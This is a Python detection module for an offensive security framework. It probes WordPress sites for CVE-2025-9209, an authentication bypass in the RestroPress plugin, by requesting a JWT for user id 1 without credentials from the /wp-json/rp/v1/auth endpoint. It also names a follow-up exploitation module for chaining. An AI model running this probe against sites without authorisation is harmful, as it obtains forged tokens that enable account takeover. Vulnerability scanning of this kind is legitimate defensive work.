#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RestroPress 3.0.0–3.2.1 JWT auth bypass (CVE-2025-9209)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "restropress"
_VULN_LOW = (3, 0, 0)
_VULN_HIGH = (3, 2, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "RestroPress CVE-2025-9209 JWT bypass detect",
        "description": (
            "Detects CVE-2025-9209: RestroPress <= 3.2.1 exposes forged JWT via "
            "GET /wp-json/rp/v1/auth?user_id= for unauthenticated callers."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-9209",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-9209",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/restropress/",
        ],
        "modules": ["auxiliary/admin/http/restropress_cve_2025_9209_jwt_token"],
        "tags": ["web", "scanner", "wordpress", "restropress", "auth-bypass", "cve-2025-9209"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/restropress_cve_2025_9209_jwt_token"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "User id to request JWT for", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._base()) or ""
        if version:
            if not self.wp_version_in_range(version, _VULN_LOW, _VULN_HIGH):
                return False
        response = self.http_request(
            method="GET",
            path=self._join("/wp-json/rp/v1/auth"),
            params={"user_id": str(int(self.user_id or 1))},
            headers={"Authorization": "probe-kittysploit"},
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return False
        body = response.text or ""
        if not re.search(r'"token"\s*:\s*"eyJ', body):
            return False
        self.set_info(
            severity="critical",
            reason="RestroPress CVE-2025-9209 — unauthenticated JWT minted",
            path="/wp-json/rp/v1/auth",
            cve="CVE-2025-9209",
        )
        return True
